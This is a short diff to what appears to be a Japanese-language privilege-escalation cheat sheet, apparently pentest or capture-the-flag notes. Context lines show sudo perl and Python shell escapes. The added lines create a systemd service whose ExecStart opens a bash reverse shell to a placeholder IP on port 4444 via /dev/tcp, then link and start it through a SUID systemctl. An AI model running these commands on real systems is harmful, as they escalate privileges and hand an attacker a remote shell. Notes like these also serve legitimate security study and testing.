@@ -14,6 +14,17 @@ sudo systemctl status <サービス>
 sudo perl -e 'exec "/bin/sh";'
 # pdbの悪用
 import os;os.system('/bin/sh')
+# systemctlのSUID悪用
+cat << EOF > test.service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1"
+[Install]
+WantedBy=multi-user.target
+EOF
+cd ~
+systemctl link /home/test/test.service
+systemctl start test.service
 ```
 
 # tmuxとは
